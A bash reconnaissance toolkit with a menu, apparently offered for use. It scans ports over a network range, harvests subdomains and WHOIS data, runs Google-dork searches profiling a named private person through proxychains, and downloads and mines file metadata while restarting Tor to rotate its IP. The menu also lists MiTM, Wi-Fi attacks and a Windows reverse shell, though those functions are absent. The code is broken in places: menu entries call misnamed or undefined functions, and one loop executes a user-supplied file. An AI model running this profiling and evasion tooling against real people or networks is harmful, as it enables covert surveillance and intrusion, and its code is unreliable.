#!/bin/bash
# TODO: ADD HEADER INFORMATION
# TODO: CONFIGURE PROXYCHAINS WHEN INITIALIZING THE SCRIPT

######################## VARIABLES ########################

    # Color definitions
    BLACK="\e[30m"
    RED="\e[31m"
    GREEN="\e[32m"
    YELLOW="\e[33m"
    BLUE="\e[34m"
    MAGENTA="\e[35m"
    CYAN="\e[36m"
    WHITE="\e[37m"
    GRAY="\e[90m"

    # Background color definitions
    BG_BLACK="\e[40m"
    BG_RED="\e[41m"

    # Reset terminal color
    RESET="\e[0m"

######################## SUPPORT FUNCTIONS ########################
    # Function: Enable Proxychains
    function enable_proxychains() {
        clear; # Clear terminal screen
        ascii_banner_art; # Call ASCII banner art
        
        # Check if proxychains is installed
        if ! command -v proxychains &> /dev/null; then
            echo -e "${RED} >>> ERROR: proxychains is not installed. Please install it before running the script. <<< ${RESET}"
            exit 1
        fi

        # Check if the proxychains configuration file exists
        if [[ ! -f /etc/proxychains.conf ]]; then
            echo -e "${RED} >>> ERROR: Proxychains configuration file not found. Make sure /etc/proxychains.conf exists. <<< ${RESET}"
            exit 1
        fi

        # Test proxychains by attempting a simple network request
        echo -e "${MAGENTA} >>> Testing proxychains with 'proxychains curl -I https://dnsleaktest.com'... ${RESET}"
        if proxychains curl -I https://dnsleaktest.com &> /dev/null; then
            echo -e "${GREEN} >>> Proxychains is working correctly. All traffic will be routed through it. <<< ${RESET}"
            countdown; # Wait for 5 seconds before continuing
            export PROXYCHAINS=1
        else
            echo -e "${RED} >>> WARNING: Proxychains test failed. Please verify your proxychains configuration. <<< ${RESET}"
            export PROXYCHAINS=0
        fi
    }

    # Function: Display the menu header with the script name and author
    function ascii_banner_art() {
        echo -e ""
        echo -e "${RED} ██████╗     ██████╗ ██╗    ██╗██╗         ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗${RESET}"
        echo -e "${RED}██╔═████╗   ██╔═████╗██║    ██║██║         ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝${RESET}"
        echo -e "${RED}██║██╔██║   ██║██╔██║██║ █╗ ██║██║         ███████╗██║     ██████╔╝██║██████╔╝   ██║   ${RESET}"
        echo -e "${RED}████╔╝██║   ████╔╝██║██║███╗██║██║         ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ${RESET}"
        echo -e "${RED}╚██████╔╝██╗╚██████╔╝╚███╔███╔╝███████╗    ███████║╚██████╗██║  ██║██║██║        ██║   ${RESET}"
        echo -e "${RED} ╚═════╝ ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ${RESET}"
        echo -e "${RED}                                                                            sh-v 0.9.1 ${RESET}"   
        echo -e "${GRAY}+===================================== 0.0wL ========================================+${RESET}"
        echo -e "${GRAY}+                          Created by JPGress a.k.a R3v4N||0wL                       +${RESET}"
        echo -e "${GRAY}+====================================================================================+${RESET}"
    }

    function subtitle() {
        echo -e "${RED}+====================================================================================+${RESET}"
    }

    # Function: Disabled
    function disabled() {
        echo ""
        echo -e "${RED} >>> FUNCTION DISABLED <<< ${RESET}"
        echo ""
        echo -e "${GRAY} Press ENTER to continue ${RESET}"
        read -r
        main_menu
    }

    # Function: Error message for non-root users
    function error_not_root() {
        clear
        echo ""
        echo -e "${BG_BLACK}${RED} >>> YOU MUST BE ROOT TO RUN THIS SCRIPT! <<< ${RESET}"
        echo ""
        exit 1
    }

    # Function: Error message for invalid usage
    function error_invalid_usage() {
        clear
        echo ""
        echo -e "${BG_BLACK}${RED} >>> ERROR! <<< ${RESET}"
        echo ""
        echo -e "${BG_BLACK}${RED} Usage: $0 ${RESET}"
        exit 1
    }

    # Function: Invalid option
    function invalid_option() {
        echo -e "${BG_RED}${BLACK} INVALID OPTION! ${RESET}${RED} Please run the script again and choose a valid option.${RESET}"
        echo -e "${GRAY} Press ENTER to continue ${RESET}"
        read -r
        main_menu
    }

    # Function: Exit script (on zero input)
    function exit_script() {
        clear; # Clear terminal screen
        ascii_banner_art; # Call ASCII banner art
        echo -e "${RED} >>> Exiting the script. Bye! ${RESET}"
        echo -e "${RED} Press ENTER to continue ${RESET}"
        read -r 2> /dev/null
        clear; # Clear terminal screen
        exit 0
    }

    # Function: Pause the script
    function pause_script() {
        echo -e "${GRAY} Press ENTER to continue ${RESET}"
        read -r 2> /dev/null
        main_menu
    }

    # Function: 3-second countdown
    function countdown() {
        local seconds=3 # Number of seconds for the countdown

        # Countdown loop
        while [ $seconds -gt 0 ]; do
            echo -ne "${GRAY} Starting in: $seconds \r${RESET}" # Display the countdown and overwrite the same line
            sleep 1 # Wait for 1 second
            ((seconds--)) # Decrease the countdown value
        done
    }

    # Function: Validate user input for the main menu
    function validate_input() {
        local input="$1" # The input to validate
        local valid_options=("$@") # All valid options passed as arguments (from the second argument onward)

        # Check if the input is in the list of valid options
        for option in "${valid_options[@]:1}"; do
            if [[ "$input" == "$option" ]]; then
                return 0 # Input is valid
            fi
        done

        # If we reach here, the input is invalid
        echo -e "${RED} >>> Invalid option: $input. Please choose a valid menu option. <<< ${RESET}"
        return 1 # Input is invalid
    }

    # Function: Display the main menu
    function display_main_menu() {
        clear; # Clears the terminal screen
        ascii_banner_art; # Call ASCII banner art

        # Display numbered menu options
        echo -e "${MAGENTA} 1 - Portscan ${RESET}" 
        echo -e "${MAGENTA} 2 - Parsing HTML ${RESET}" 
        echo -e "${MAGENTA} 3 - Google Hacking for people OSINT ${RESET}" 
        echo -e "${MAGENTA} 4 - Metadata Analysis ${RESET}" 
        echo -e "${MAGENTA} 5 - DNS Zone Transfer ${RESET}" 
        echo -e "${MAGENTA} 6 - Subdomain Takeover ${RESET}" 
        echo -e "${GRAY}${BG_BLACK} 7 - Reverse DNS ${RESET}" 
        echo -e "${MAGENTA} 8 - DNS Reconnaissance ${RESET}"
        echo -e "${GRAY}${BG_BLACK} 9 - OSINTool ${RESET}"
        echo -e "${MAGENTA} 10 - MiTM (Man-in-the-Middle)"
        echo -e "${GRAY}${BG_BLACK} 11 - Portscan (Bash sockets) ${RESET}"
        echo -e "${MAGENTA} 12 - Useful Commands for Network Management"
        echo -e "${MAGENTA} 13 - Examples of the 'find' Command"
        echo -e "${MAGENTA} 14 - Root Password Reset Guide (Debian)"
        echo -e "${GRAY}${BG_BLACK} 15 - Root Password Reset Guide (Red Hat)${RESET}"
        echo -e "${MAGENTA} 16 - Quick Guide to Using Vim"
        echo -e "${GRAY}${BG_BLACK} 17 - Escape Techniques for rbash (Testing) ${RESET}"
        echo -e "${MAGENTA} 18 - Wireless Network Attacks"
        echo -e "${MAGENTA} 19 - Windows Tips"
        echo -e "${GRAY}${BG_BLACK} 20 - Create Scripts in .bat or .ps1 ${RESET}"
        echo -e "${MAGENTA} 21 - Switch to Sgt Domingues' Scanning Script"
        echo -e "${MAGENTA} 22 - NMAP Network Scan ${RESET}"
        echo -e "${GRAY}${BG_BLACK} 23 - Reserved Option ${RESET}"
        echo -e "${GRAY}${BG_BLACK} 24 - Reverse Shell for Windows ${RESET}"
        echo -e "${GRAY}${BG_BLACK} 25 - RDP for Windows ${RESET}"

        # Display instructions to exit the menu
        echo -e "${GRAY}+==============================================+${RESET}"
        echo -e " ${WHITE}Enter 0 (zero) to exit${RESET}"
        echo -e "${GRAY}+==============================================+${RESET}"
    }

######################## MAIN MENU ########################
    # Function: Main menu
    function main_menu() {
        display_main_menu # Display the menu

        # Define valid menu options dynamically
        valid_options=()
        for i in {0..25}; do
            if [[ "$i" -ne 23 ]]; then
                valid_options+=("$i")
            fi
        done

        # Prompt user for input
        echo -ne "${CYAN} Enter the option number: ${RESET}"
        read -r MENU_OPTION # Read user input

        # Validate the user input
        if ! validate_input "$MENU_OPTION" "${valid_options[@]}"; then
            invalid_option # Call the invalid_option function if input is invalid
            main_menu # Restart the menu
            return
        fi

        # If valid, proceed to handle the selected option
        case $MENU_OPTION in
            0) exit_script ;; # Exit the script
            1) i_portscan ;; # Perform a port scan
            2) ii_parsing_html ;; # Parse HTML
            3) iii_google_hacking ;; # Perform Google Hacking
            4) iv_metadata_analysis ;; # Analyze metadata from the Internet
            5) v_dns_zone_transfer ;; # Perform DNS Zone Transfer
            6) vi_subdomain_takeover ;; # Perform Subdomain Takeover
            7) disabled ;; # DISABLED FOR MAINTENANCE -> vii_reverse_dns ;;
            8) viii_dns_recon ;; # DNS Reconnaissance
            9) disabled ;; # DISABLED - REQUIRES REFACTORING -> ix_google_general_query ;;
            10) x_mitm ;; # MiTM (Man-in-the-Middle)
            11) disabled ;; # DISABLED FOR MAINTENANCE -> xi_portscan_bashsocket ;;
            12) xii_network_management_commands ;; # Useful network management commands
            13) xiii_find_command_examples ;; # Examples of the 'find' command
            14) xiv_debian_root_password_reset ;; # Root password reset guide for Debian
            15) disabled ;; # DISABLED FOR MAINTENANCE -> xv_redhat_root_password_reset ;;
            16) xvi_vim_quick_guide ;; # Quick guide to using Vim
            17) disabled ;; # DISABLED FOR MAINTENANCE -> xvii_rbash_escape_techniques ;;
            18) xviii_wifi_attacks ;; # Wireless network attacks
            19) xix_windows_basic_commands ;; # Basic Windows commands
            20) disabled ;; # DISABLED FOR MAINTENANCE -> xx_create_windows_script ;; #! TODO: DELETE
            21) xxi_sgt_domingues_scanning_script ;; # Switch to Sgt Domingues' scanning script ;; #! TODO: DELETE
            22) xxii_nmap_network_discovery ;; # NMAP network scan
            24) disabled ;; # DISABLED FOR MAINTENANCE -> xxiv_windows_revshell ;;
            25) disabled ;; # DISABLED FOR MAINTENANCE -> xxv_windows_rdp ;;
            *) invalid_option ;; # Fallback case (should never happen with validation)
        esac
    }

######################## FUNÇÕES DO MENU ########################
    # Function: Script to perform a port scan on a network using netcat
    function i_portscan() {
        # i_portscan - Script to perform a port scan on a network using netcat
            #
            # Description:
            # This script performs the following operations:
            # 1. Checks for common open ports on all hosts within a specified IP range (CIDR format).
            # 2. Dynamically loads a user-defined number of top ports (e.g., 20, 100, 1000) from Nmap's services file, if available.
            # 3. Falls back to a predefined list of common ports if Nmap's file is unavailable.
            # 4. Prints results for each host and open port found.
            # 5. Saves the results in two file formats:
            #    - Plain text (`portscan_results.txt`) for human-readable output.
            #    - CSV (`portscan_results.csv`) for structured data analysis.
            #
            # Dependencies:
            # - netcat (nc): To perform the port scanning.
            # - ipcalc: To validate and parse CIDR-based network masks.
            # - awk: To process data from Nmap's services file.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-23
            # Last Updated: 2025-01-24
            # Version: 1.2
            #
            # Version history:
            # - 1.0 (2025-01-23): Initial version with basic port scanning functionality.
            # - 1.1 (2025-01-23): Added support for saving results in `.txt` and `.csv` formats.
            #                     Integrated dynamic port loading from Nmap's services file.
            # - 1.2 (2025-01-23): Added user input to define the number of top ports to scan.
            #                     Improved flexibility and user control over scan depth.
            #
            # Notes:
            # - Ensure the required dependencies are installed before running the script.
            # - If `ipcalc` is not installed, the script will attempt to install it automatically.
            # - Users can dynamically select the number of top ports to scan.
            # - Results are saved in the current working directory as `portscan_results.txt` and `portscan_results.csv`.
            # - Handles Ctrl+C interruptions gracefully and returns to the main menu.
            #
            # Example usage:
            # - Input:
            #   - Number of ports: 100
            #   - CIDR: "192.168.1.0/24"
            # - Output:
            #   - Terminal: "Host: 192.168.1.1 - Open Port: 80"
            #   - Text File: "Host: 192.168.1.1 - Open Port: 80"
            #   - CSV File: "192.168.1.1,80,Open"

        clear
        echo -e "${MAGENTA}1 - Portscan using netcat ${RESET}"
        echo -e "${GRAY}+======================================================================+${RESET}"
        echo -e "${GRAY}This port scan checks common open ports on all hosts in the network."
        echo -e "${GRAY}+======================================================================+${RESET}"

        # Ask the user how many top ports they want to scan
        echo -ne "${CYAN}Enter the number of top ports to scan (e.g., 20, 100, 1000): ${RESET}"
        read -r TOP_PORTS

        # Validate the user's input (ensure it's a positive number)
        if ! [[ "$TOP_PORTS" =~ ^[0-9]+$ ]] || [[ "$TOP_PORTS" -le 0 ]]; then
            echo -e "${RED}Invalid input! Please enter a positive number.${RESET}"
            main_menu
            return
        fi

        # Load ports dynamically from Nmap or use a fallback list
        local nmap_services="/usr/share/nmap/nmap-services" # Path to Nmap's services file
        local fallback_ports="80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900"

        if [[ -f "$nmap_services" ]]; then
            # Extract the top N ports based on the user's choice
            PORT_LIST=$(awk '!/^#/ {print $2}' "$nmap_services" | grep -Eo '^[0-9]+' | sort -n | uniq | head -n "$TOP_PORTS" | paste -sd ',')

            if [[ -n "$PORT_LIST" ]]; then
                echo -e "${GREEN}Loaded the TOP $TOP_PORTS ports from Nmap's services file: $nmap_services${RESET}"
            else
                echo -e "${YELLOW}Warning: Failed to extract ports from Nmap's services file. Falling back to predefined ports.${RESET}"
                PORT_LIST="$fallback_ports"
            fi
        else
            echo -e "${YELLOW}Warning: Nmap services file not found at $nmap_services. Falling back to predefined ports.${RESET}"
            PORT_LIST="$fallback_ports"
        fi

        # Handle Ctrl+C interruptions gracefully
        trap 'echo -e "\nScript interrupted by user."; main_menu; exit 1' SIGINT

        # Ask user to enter the IP range in CIDR notation
        echo -ne "${CYAN}Enter the IP range in CIDR notation (e.g., 192.168.1.0/24): ${RESET}"
        read -r NETWORK_MASK

        # Validate the network mask
        if ! ipcalc -n -b -m "$NETWORK_MASK" >/dev/null 2>&1; then
            echo "Invalid network mask."
            main_menu
            return
        fi

        # Extract the network prefix from the mask
        NETWORK_PREFIX=$(ipcalc -n -b "$NETWORK_MASK" | awk '/Network/ {print $2}' | awk -F. '{print $1"."$2"."$3}')

        # Start scanning each host in the network for the specified ports
        echo -e "${CYAN}Scanning network: $NETWORK_MASK ${RESET}"
        for HOST in $(seq 1 254); do
            IP="$NETWORK_PREFIX.$HOST"
            for PORT in $(echo "$PORT_LIST" | tr ',' ' '); do
                # Check if the port is open on the host
                nc -z -w 1 "$IP" "$PORT" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}Host: $IP - Open Port: $PORT ${RESET}"
                fi
            done
        done

        # Completion message
        echo -e "${GREEN}Scan completed for $NETWORK_MASK using the TOP $TOP_PORTS ports.${RESET}"
        echo -e "${GRAY}Press ENTER to continue...${RESET}"
        read -r
        main_menu
    }

    # Function: Script to analyze subdomains and WHOIS information for a website or a list of websites.
    function ii_parsing_html() {
        # parsing_html - Script to analyze subdomains and WHOIS information for a website or a list of websites.
            #
            # Description:
            # This script performs the following operations:
            # 1. Extracts subdomains from an HTML page.
            # 2. Retrieves IP addresses associated with each subdomain.
            # 3. Fetches WHOIS information for each domain.
            # 4. Generates a report with the results.
            #
            # Dependencies:
            # - curl: To make HTTP requests.
            # - dig: To retrieve IP addresses of subdomains.
            # - whois: To get WHOIS information for domains.
            # - nslookup: For DNS lookups.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2024-01-15
            # Last Updated: 2024-01-24
            # Version: 1.1
            #
            # Version history:
            # - 1.0 (2024-01-15): Initial version with basic subdomain and WHOIS functionality.
            # - 1.1 (2024-01-24): Added dependency checks and updated timestamp format.
            #
            # Example usage:
            # - Input: https://example.com
            # - Output: Subdomains, IP addresses, WHOIS information for each domain.
            #
            # Notes:
            # - Ensure the dependencies are installed before running the script.
            # - The report is saved in a file named "result_<URL>_<date>.txt".
            #

        # Function to check if dependencies are installed
        check_dependencies() {
            local dependencies=("curl" "whois" "nslookup" "dig")
            for dep in "${dependencies[@]}"; do
                if ! command -v "$dep" &>/dev/null; then
                    echo -e "${RED}Error: Dependency '$dep' is not installed.${RESET}"
                    echo "Please install '$dep' before running this script."
                    exit 1
                fi
            done
        }

        # Call the dependency check function
        check_dependencies

        # Prompt the user to input the desired website URL
        echo -n "Enter the URL of the website to analyze (e.g.: businesscorp.com.br): "
        read -r SITE

        # Store the current date and time in the specified format (day-hour-minutes-month-year)
        timestamp=$(date +"%d%H%M%b%Y" | tr '[:lower:]' '[:upper:]') # Example: 241408JAN2024
        output_file="result_${SITE}_${timestamp}.txt"

        # Function to print text in color
        print_color() {
            local color=$1
            local text=$2
            echo -e "\e[0;${color}m${text}\e[0m"
        }

        # Function to extract subdomains from an HTML page
        extract_subdomains() {
            local site=$1
            curl -s "$site" | grep -Eo '(http|https)://[^/"]+' | awk -F[/:] '{print $4}' | sort -u
        }

        # Function to get the IP address of a subdomain
        get_ip_address() {
            local subdomain=$1
            local ip_address
            ip_address=$(host "$subdomain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1)
            echo "$ip_address:$subdomain"
        }

        # Function to get WHOIS information for a domain
        get_whois_info() {
            local domain=$1
            whois "$domain" | grep -vE "^\s*(%|\*|;|$|>>>|NOTICE|TERMS|by|to)" | grep -E ':|No match|^$'
        }

        # Function to get DNS lookup information for a domain
        get_dns_info() {
            local domain=$1
            nslookup "$domain" 2>/dev/null | grep "Address" | awk '{print $2}' | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/, /g'
        }

        # Add the timestamp to the beginning of the output file
        echo -e "Report generated on: $timestamp\n" > "$output_file"

        # Analyze the provided site
        print_color 33 "Analyzing subdomains for: $SITE"
        subdomains=($(extract_subdomains "$SITE"))

        # Check if any subdomains were found
        if [ ${#subdomains[@]} -eq 0 ]; then
            print_color 31 "No subdomains found for: $SITE"
            echo "No subdomains found for: $SITE" >> "$output_file"
        else
            print_color 32 "Subdomains found:"
            for subdomain in "${subdomains[@]}"; do
                print_color 36 "$subdomain"

                # Get IP address for the subdomain
                ip_result=$(get_ip_address "$subdomain")
                echo "$ip_result" >> "$output_file"

                # Add WHOIS information
                print_color 34 "WHOIS information for $subdomain"
                get_whois_info "$subdomain" >> "$output_file"

                # Add DNS lookup information
                print_color 34 "DNS Lookup information for $subdomain"
                get_dns_info "$subdomain" >> "$output_file"

                echo -e "\n" >> "$output_file"
            done
        fi

        # Completion message
        print_color 32 "Analysis complete. Results saved to: $output_file"
        echo -e "${GRAY}Press ENTER to continue${RESET}"
        read -r 2>/dev/null
        main_menu
    }

    # Function: Script to automate Google hacking queries for reconnaissance
    function iii_google_hacking() {
        # iii_google_hacking - Automates Google hacking queries for reconnaissance
            #
            # Description:
            # This script automates Google hacking techniques to gather information about a target.
            # It performs the following operations:
            # 1. Conducts general searches for the target using Google.
            # 2. Searches for specific file types (e.g., PDF, DOCX) containing the target's name.
            # 3. Searches within specific websites (e.g., LinkedIn, Pastebin) for target-related data.
            # 4. Verifies the user's IP address for anonymity before performing queries.
            # 5. Logs all search URLs and details to a file for reference and auditing.
            #
            # Improvements in Version 1.5:
            # - **Fixed Logical Issue**: Browser queries now run in the background to prevent blocking subsequent searches.
            # - **Enhanced Logging**: Debug logs added to track query progress and identify any potential bottlenecks.
            # - **Simplified IP Verification**: Replaced interactive browser-based IP check with a lightweight `curl` request.
            # - **Improved Stability**: Introduced better flow control and error handling for proxy execution.
            #
            # Dependencies:
            # - Firefox or a compatible browser (default: Firefox).
            # - proxychains4: To route queries through proxies for anonymity.
            # - curl: For lightweight IP verification.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2024-01-15
            # Last Updated: 2025-01-25
            # Version: 1.5
            #
            # Version history:
            # - 1.0 (2024-01-15): Initial version with basic Google hacking queries.
            # - 1.1 (2024-01-24): Refactored for modularity, added input validation, improved user prompts, and added error handling.
            # - 1.2 (2024-01-24): Introduced logging for all searches to a timestamped file.
            # - 1.3 (2024-01-25): Integrated proxy rotation for anonymity and processed dorks for proper formatting.
            # - 1.4 (2024-01-25): Refactored repetitive `proxychains4 $SEARCH` calls into a reusable function.
            # - 1.5 (2025-01-25): Resolved blocking issue with browser queries, enhanced logging, and improved flow control.
            #
            # Example usage:
            # - Input: "Fatima de Almeida Lima"
            # - Output:
            #   - General Google queries, file type searches, and specific website searches performed anonymously.
            #   - Log file saved as "<TARGET>_<timestamp>.log".
            #
            # Notes:
            # - Ensure Firefox or the browser specified in the `SEARCH` variable is installed.
            # - Logs are saved as "<TARGET>_<timestamp>.log" in the current directory.
        # - Designed for educational purposes only; respect applicable laws and ethics.


        # Default browser for search
        SEARCH="firefox"

        # Function to ensure the browser is installed
        function check_browser() {
            if ! command -v "$SEARCH" >/dev/null 2>&1; then
                echo -e "${RED}Error: The browser '$SEARCH' is not installed. Please install it or update the 'SEARCH' variable.${RESET}"
                return 1
            fi
            if ! command -v "proxychains4" >/dev/null 2>&1; then
                echo -e "${RED}Error: 'proxychains4' is not installed. Please install it to enable proxy rotation.${RESET}"
                return 1
            fi
        }

        # Function to prompt the user for the target name
        function google_hacking_menu() {
            clear
            echo -e "${RED}Google Hacking OSINT for People Reconnaissance${RESET}"
            echo -e "${YELLOW}+=============================================+${RESET}"
            echo -e "${CYAN}For better results, put the target in quotes (e.g., \"Fatima de Almeida Lima\").${RESET}"
            echo -n "Enter the target name for the search: "
            read -r TARGET

            # Validate input
            while [[ -z "$TARGET" ]]; do
                echo "Target name cannot be empty. Please try again."
                echo -n "Enter the target name for the search: "
                read -r TARGET
            done

            # Process target as a proper dork (quoted and URL encoded)
            PROCESSED_TARGET=$(echo "\"$TARGET\"" | sed 's/ /%20/g')

            # Create a timestamped log file for the target
            TIMESTAMP=$(date +"%d%H%M%b%Y" | tr '[:lower:]' '[:upper:]')
            LOG_FILE="${TARGET}_${TIMESTAMP}.log"
            echo -e "Log for target: $TARGET\nGenerated on: $(date)\n" > "$LOG_FILE"
        }

        # Function to execute a search query through proxychains
        function perform_query() {
            local url=$1
            echo "Executing query: $url"
            echo "$url" >> "$LOG_FILE"  # Log the query
            proxychains4 $SEARCH "$url" 2>/dev/null &  # Run in the background
            sleep 1  # Optional delay between queries
        }

        # Function to check the current IP address
        function check_ip() {
            echo "Checking your current IP address..."
            local ip=$(curl -s https://api.ipify.org)
            if [[ -z "$ip" ]]; then
                echo "Failed to retrieve IP address. Please check your connection or proxy settings."
                echo "Failed to retrieve IP address." >> "$LOG_FILE"
            else
                echo "Your current IP address is: $ip"
                echo "Current IP address: $ip" >> "$LOG_FILE"
            fi
        }

        # Function for general searches
        function generalSearch() {
            check_ip  # Check and log the IP address
            perform_query "https://webmii.com/people?n=$PROCESSED_TARGET"  # Search on WEBMII
            perform_query "https://www.google.com/search?q=intext:$PROCESSED_TARGET"  # General Google search
        }

        # Function for searches within specific websites
        function siteSearch() {
            local site="$1"
            local domain="$2"
            perform_query "https://www.google.com/search?q=inurl:$domain+intext:$PROCESSED_TARGET"
        }

        # Function for file type searches
        function FileSearch() {
            local type="$1"
            local extension="$2"
            perform_query "https://www.google.com/search?q=filetype:$extension+intext:$PROCESSED_TARGET"
        }

        # Check if the browser and proxychains4 are installed
        check_browser || return 1

        # Prompt for the target name
        google_hacking_menu

        # Perform general searches
        generalSearch

        # List of file types and their extensions for targeted searches
        file_types=("PDF" "PPT" "DOC" "DOCX" "XLS" "XLSX" "ODS" "ODT" "TXT" "PHP" "XML" "JSON" "PNG" "SQLS" "SQL")
        extensions=("pdf" "ppt" "doc" "docx" "xls" "xlsx" "ods" "odt" "txt" "php" "xml" "json" "png" "sqls" "sql")

        # Perform file type searches
        for ((i = 0; i < ${#file_types[@]}; i++)); do
            echo "Processing file type: ${file_types[i]} with extension: ${extensions[i]}" >> "$LOG_FILE"
            FileSearch "${file_types[i]}" "${extensions[i]}"
            echo "Finished processing file type: ${file_types[i]}" >> "$LOG_FILE"
        done

        # List of sites and their corresponding domains for targeted searches
        sites=("Government" "Pastebin" "Trello" "GitHub" "LinkedIn" "Facebook" "Twitter" "Instagram" "TikTok" "YouTube" "Medium" "Stack Overflow" "Quora" "Wikipedia")
        domains=(".gov.br" "pastebin.com" "trello.com" "github.com" "linkedin.com" "facebook.com" "twitter.com" "instagram.com" "tiktok.com" "youtube.com" "medium.com" "stackoverflow.com" "quora.com" "wikipedia.org")

        # Perform searches on specific sites
        for ((i = 0; i < ${#sites[@]}; i++)); do
            echo "Processing site: ${sites[i]} with domain: ${domains[i]}" >> "$LOG_FILE"
            siteSearch "${sites[i]}" "${domains[i]}"
            echo "Finished processing site: ${sites[i]}" >> "$LOG_FILE"
        done

        echo -e "${GRAY}All searches logged in: $LOG_FILE${RESET}"
        echo -e "${GRAY}Press ENTER to return to the main menu.${RESET}"
        read -r 2>/dev/null
        main_menu
    }   

function iv_metadata_analysis() {
    SEARCH="proxychains4 -q lynx -dump -hiddenlinks=merge -force_html"
    
    # Function to prompt the user for required input
    function metadata_analysis_menu() {
        clear;
        ascii_banner_art;
        echo -e "${MAGENTA} Metadata Analysis from the Internet${RESET}"
        echo -e "${MAGENTA}+===================================+${RESET}"
        echo -n "Enter the domain or extension to search (e.g., .gov.br): "
        read -r SITE
        echo -n "Enter the file extension to search for (e.g., .pdf): "
        read -r FILE
        echo -n "[Optional] Enter a keyword to refine the search (e.g., vaccine): "
        read -r KEYWORD
    }

    # Function to restart the Tor service for IP rotation
    function restart_tor() {
        echo ""
        echo -e "${MAGENTA}Restarting Tor to rotate IP.${RESET}"
        echo -e "${GRAY} Please wait...${RESET}"
        if sudo systemctl restart tor; then
            echo -e "${GREEN} =====================================================${RESET}"
            echo -e "${GREEN} Tor restarted successfully. New IP circuit activated!${RESET}"
            echo -e "${GREEN} =====================================================${RESET}"
            sleep 3  # Allow time for the new circuit to establish
        else
            echo -e "${RED}Failed to restart Tor. Check your Tor configuration or service status.${RESET}"
            exit 1
        fi
    }

    # Function to perform the search based on user input
    function perform_search() {
        
        restart_tor;
        
        TIMESTAMP=$(date +%d%H%M%b%Y)-UTC
        FILTERED_RESULTS_FILE="${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"

        echo "Searching for $FILE files on $SITE..."
        restart_tor;  # Rotate IP before performing the query

        $SEARCH "https://www.google.com/search?q=inurl:$SITE+filetype:$FILE+intext:$KEYWORD" \
            | grep -Eo 'https?://[^ ]+\.'"$FILE" \
            | sed 's/&.*//' > "$FILTERED_RESULTS_FILE"

        if [[ -s "$FILTERED_RESULTS_FILE" ]]; then
            echo "Search successful. Results saved to $FILTERED_RESULTS_FILE"
        else
            echo "No results found for the specified search criteria."
            echo "Raw search results saved to raw_results_${TIMESTAMP}.txt"
        fi
    }

    # Function to download files from the search results
    function download_files() {
        FILE_LIST="$1"
        FOLDER="${SITE}_${TIMESTAMP}"
        mkdir -p "$FOLDER"

        while IFS= read -r URL; do
            echo "Downloading $URL..."
            restart_tor  # Rotate IP before each download
            proxychains4 wget -P "$FOLDER" "$URL"
        done < "$FILE_LIST"

        rm -f "$FILE_LIST"  # Clean up the temporary results file
    }

    # Function to analyze metadata of downloaded files
    function analyze_metadata() {
        FOLDER="${SITE}_${TIMESTAMP}"
        echo "Analyzing metadata in files from folder: $FOLDER"
        cd "$FOLDER" || exit
        exiftool ./*
        cd - || exit
    }

    # Start the process
    metadata_analysis_menu
    perform_search

    if [[ -s "${TIMESTAMP}_${SITE}_${FILE}_filtered.txt" ]]; then
        download_files "${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"
        analyze_metadata
    else
        echo "No files found for the specified search criteria."
    fi

    echo -e "${GRAY}Press ENTER to return to the main menu.${RESET}"
    read -r 2>/dev/null
    main_menu
}

   

# Define a função v_dns_zt para realizar uma transferência de zona DNS
function v_dns_zt(){
    echo "DNS Zone Transfer"
    echo "Digite a URL do alvo"
    read -r TARGET
    
    # Obter servidores de nomes para o domínio especificado
    NS_SERVERS=$(host -t ns "$TARGET" | awk '{print $4}')
    
    # Iterar sobre os servidores de nomes e listar os registros de zona de autoridade
    for SERVER in $NS_SERVERS; do
        host -l -a "$TARGET" "$SERVER"
    done
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função vi_Subdomain_takeover para realizar um ataque de Subdomain Takeover
function vi_Subdomain_takeover(){
    # Solicita ao usuário o host para o ataque
    echo "Digite o host para o ataque de Subdomain takeover"
    read -r HOST
    
    # Solicita ao usuário o arquivo contendo os domínios a serem testados
    echo "Aponte para o arquivo com os domínios a serem testados."
    read -r FILE
    
    # Define o comando a ser usado para verificar os CNAME dos subdomínios
    COMMAND="host -t cname"
    
    # Itera sobre cada palavra no arquivo de domínios e executa o comando de verificação
    for WORD in $($FILE); do
        $COMMAND "$WORD"."$HOST" | grep "alias for"
    done
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função vii_rev_dns para realizar uma pesquisa de DNS reverso
function vii_rev_dns(){
    echo "Dns Reverse"
    
    # Solicita ao usuário o endereço para a pesquisa de DNS reverso
    echo "Insira o endereço para o DNS REVERSE"
    read -r ADDRESS
    
    # Solicita ao usuário o início do intervalo de endereços IP
    echo "Digite o início do intervalo de endereços IP"
    read -r START
    
    # Solicita ao usuário o fim do intervalo de endereços IP
    echo "Digite o fim do intervalo de endereços IP"
    read -r END
    
    # Define o nome do arquivo de saída
    OUTPUT="$ADDRESS.$START-$END.txt"
    
    # Remove o arquivo de saída se existir e cria um novo
    rm -rf "$OUTPUT"
    touch "$OUTPUT"
    
    # Itera sobre os endereços IP no intervalo especificado e realiza a pesquisa de DNS reverso
    for RANGE in $(seq "$START" "$END"); do
        # Usa o comando host para obter o registro PTR e extrai o nome do host
        host -t ptr "$ADDRESS"."$RANGE" | cut -d ' ' -f5 | grep -v '.ip-' >> "$OUTPUT"
    done
    
    # Exibe o conteúdo do arquivo de saída
    cat "$OUTPUT"
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
